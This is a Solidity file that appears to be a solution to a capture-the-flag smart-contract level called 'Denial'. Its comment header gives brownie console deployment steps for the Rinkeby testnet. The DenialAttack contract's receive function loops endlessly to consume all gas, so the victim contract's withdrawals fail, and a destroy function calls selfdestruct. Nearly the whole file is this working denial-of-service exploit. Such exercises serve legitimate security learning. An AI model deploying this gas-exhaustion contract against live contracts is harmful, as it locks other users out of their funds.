
/* 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deploy attack contract

# call setWithdrawPartner with attack contract address as input

# submit

# (OPTIONAL) call destroy()

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;


interface Denial {

    function setWithdrawPartner(address _partner) external;
}


contract DenialAttack {


receive() external payable {

while (true) {
// consumes all the gas of the transaction which will cause the transaction to revert. preventing your partner from claiming ETH
// using revert() will not work as the Denial contract doesn't check the result.
    this;
    }

}

function destroy() external {

    selfdestruct(payable(msg.sender));
    }
}
